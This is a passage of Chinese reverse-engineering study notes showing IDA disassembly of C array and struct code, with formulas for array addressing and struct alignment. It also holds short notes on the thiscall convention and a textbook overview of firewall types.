class="hljs-number">0000000000401552</span>                 sub     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">0000000000401559</span>                 lea     rbp, [rsp+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">0000000000401561</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_0], ecx<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_8], rdx<br>.text:<span class="hljs-number">0000000000401568</span>                 call    __main<br>.text:<span class="hljs-number">000000000040156</span>D                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_70] <br>.text:<span class="hljs-number">0000000000401571</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401576</span>                 mov     ecx, <span class="hljs-number">0</span>Ch<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     rdi, rdx<br>.text:<span class="hljs-number">000000000040157</span>E                 rep stosq<br>.text:<span class="hljs-number">0000000000401581</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_74], <span class="hljs-number">0</span>  <br>.text:<span class="hljs-number">0000000000401588</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_78], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040158F</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_7C], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401596</span>                 lea     rcx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">000000000040159</span>A                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">000000000040159</span>E                 lea     rax, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015</span>A2                 mov     r9, rcx<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     r8, rdx<br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     rdx, rax<br>.text:<span class="hljs-number">00000000004015</span>AB                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d%d%d&quot;</span>  <span class="hljs-comment">//读取三维数组</span><br>.text:<span class="hljs-number">00000000004015B</span>2                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">00000000004015B</span>7                 mov     edx, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015B</span>A                 mov     eax, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">00000000004015B</span>D                 mov     ecx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">00000000004015</span>C0                 movsxd  rcx, ecx<br>.text:<span class="hljs-number">00000000004015</span>C3                 movsxd  rdx, edx<br>.text:<span class="hljs-number">00000000004015</span>C6                 movsxd  r8, eax<br>.text:<span class="hljs-number">00000000004015</span>C9                 mov     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>CC                 add     rax, rax<br>.text:<span class="hljs-number">00000000004015</span>CF                 add     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>D2                 add     rax, r8<br>.text:<span class="hljs-number">00000000004015</span>D5                 shl     rax, <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>D9                 add     rax, rcx<br>.text:<span class="hljs-number">00000000004015</span>DC                 mov     [rbp+rax*<span class="hljs-number">4</span>+<span class="hljs-number">20</span>h+var_70], <span class="hljs-number">9</span><br>.text:<span class="hljs-number">00000000004015E4</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015E9</span>                 add     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">00000000004015F</span>0                 pop     rdi<br>.text:<span class="hljs-number">00000000004015F</span>1                 pop     rbp<br>.text:<span class="hljs-number">00000000004015F</span>2                 retn<br>.text:<span class="hljs-number">00000000004015F</span>2 main            endp<br></code></pre></td></tr></table></figure><p>公式先贴出来:</p><p>　　<strong>Ary + sizeof(type[C][H]) * i + sizeof(type[H])*j + sizeof(type)*k</strong></p><p> 代入公式看汇编</p><p>　　1.eax &#x3D; i的值</p><p>  　　2. eax * 30 ,相当于求 sizeof(type[C][H]) * i</p><p>　　3.求出数组首地址+eax,也就是求出了 Ary[M]的位置,给Ecx赋值</p><p>　　4.求出j的值</p><p>　　5.左移4位,相当于2^4次方也就是16 这一步相当于求 sizeof(type[H])的值</p><p>　　6.ary[M] + sizeof(type[H])的值得出了 ary[M][C]的值</p><p>　　7.求出k的值</p><p>　　8.数组寻址公式 ary[M][C]的值 + 4 * k的值.</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> ch;<br>    <span class="hljs-keyword">int</span>  number1;<br>    <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> number2;<br>    <span class="hljs-keyword">double</span> dbl;<br>    <span class="hljs-keyword">float</span> flt;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span> <span class="hljs-title">t1</span>=</span>&#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>,<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">2</span>,<br>    <span class="hljs-number">3.14</span>,<br>    <span class="hljs-number">0.0</span>    <br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,<span class="hljs-keyword">sizeof</span>(t1));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: __tmainCRTStartup+242↑p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                                         <span class="hljs-comment">; DATA XREF: .pdata:000000000040506C↓o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_20          = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">20h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_1C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">1Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_18          = <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_10          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_8           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401551</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401554</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401558</span>                 <span class="hljs-keyword">call</span>    __main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040155D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_20], <span class="hljs-number">61h</span> <span class="hljs-comment">; &#x27;a&#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401561</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_1C], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401568</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_18], <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>000000000040156E                 <span class="hljs-keyword">movsd</span>   <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:qword_404008<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401576</span>                 <span class="hljs-keyword">movsd</span>   [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157B                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157F                 <span class="hljs-keyword">movss</span>   [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401584</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">20h</span> <span class="hljs-comment">; &#x27; &#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401589</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, Format     <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401590</span>                 <span class="hljs-keyword">call</span>    printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401595</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040159A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span>000000000040159E                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040159F                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040159F main            endp<br></code></pre></td></tr></table></figure><p>​    编译器对齐值,设置为 alg, MeMber offset 从0开始计算, 其中Member offset 要每次代入公式之后,加上自己成员所占的字节大小,继续参与下次运算</p><p>　　结构体成员偏移计算公式:  MeMber offset % min(alg,sizeof(Member type)) &#x3D;&#x3D; 0</p><p>　　结构体总大小计算公式: 　 sizeof(struct) % min(Max type size,alg) &#x3D;&#x3D; 0;</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>​    （对象调用成员函数时） lea ecx, [xxx]<br>​    (成员函数中) mov xxx，ecx ; 直接就使用了ecx call 成员函数 stdcall和cdec方式都是push传参（最后一个PUSH）<br>​    lea reg, 寄存器首地址 push reg call 成员函数<br>​    当给函数传参时第一个参数是地址，那么可以怀疑这个是类对象的成员函数 对象作为参数传递<br>​    成员简单：直接当作变量压栈，先定义的成员后压栈，后定义的成员先压栈（保证在栈中的 顺序和定义时一样）<br>​    成员复杂：将整个对象复制到栈顶（相当于整个压栈），具体操作<br>​    sub esp, 类对象长度 ; 预先申请栈空间，用于存储类对象的形参 mov ecx, 10<br>​    ;设置循环次数10次<br>​    rep movs 栈顶，对象地址 ;就是类似memcpy，将内容整体拷贝到栈顶（刚刚开辟的位置） call fun…<br>​    对象作为返回值 调用前会将对象返回的位置作为参数压栈（也就是调用方准备好空间，告诉子函数地址，到<br>时候子函数返回的过程就是直接写进那个地址）</p><p>​    空类的实例占用1字节：目的是为了能够获取到该实例的地址 对象中先定义的变量在低地址处，后定义的变量在高地址处（类似数组） 内存对齐：<br>​    每个数据存放的地址必须是自身长度的整数倍 2结构体总长度必须是数据中最长类型长度的整数倍 如果指定了#pragma pack(n)，则原值和n取min 编译器用0xCC填充<br>​    类中静态变量：是具有作用域的全局变量（同静态变量） 所以静态成员变量可以生成对象就使用（用类访问） 也无需this指针<br>​    this指针：在对象调用自己的成员函数时，会MOV ecx, 对象首地址，而进入成员函数时会自动将 ecx入栈，也就是说，实际上函数多了一个参数，是指向自己对象首地址的指针，这就是this指 针。<br>​    thiscall方式特点：使用ecx传this指针</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>​    什么是防火墙 – 一种高级访问控制设备，置于<strong>不同网络安全域 之间的一系列部件的组合</strong>，它是<strong>不同网络安全 域间通信流的唯一通道</strong>，能根据企业有关的安全政策控制（允许、拒绝、监视、记录）进出网络的访问行为。</p><p>1.简单包过滤防火墙：（综合安全性最差） </p><p>① 简单包过滤防火墙不检查数据区 ② 简单包过滤防火墙不建立连接状态表 ③ 前后报文无关 ④ 应用层控制很弱 ⑤ 处理对象：单个包报头</p><p>2.状态检测包过滤防火墙 </p><p>① 不检查数据区 ② 建立连接状态表 ③ 前后报文相关 ④ 应用层控制很弱 ⑤ 处理对象：单个包报头</p><p>3.应用代理防火墙</p><p>只检查数据，不查ip，tcp报头，不建立连接表，网络层保护较弱，处理数据包</p><p>4.核检测防火墙（综合安全性最好） </p><p>检查多个报文的会话，协议还原，上下文相关，处理一次对话</p><p>软件防火墙：保护整个网络 单机防火墙：保护澹台主机</p><p>防火墙的其他功能： 身份认证；审计、日志分析；带宽管理；负载均衡；与 IDS 联动；与病毒网关联动；与URL 服务<br>器联动；Mac 绑定；Map 映射…</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
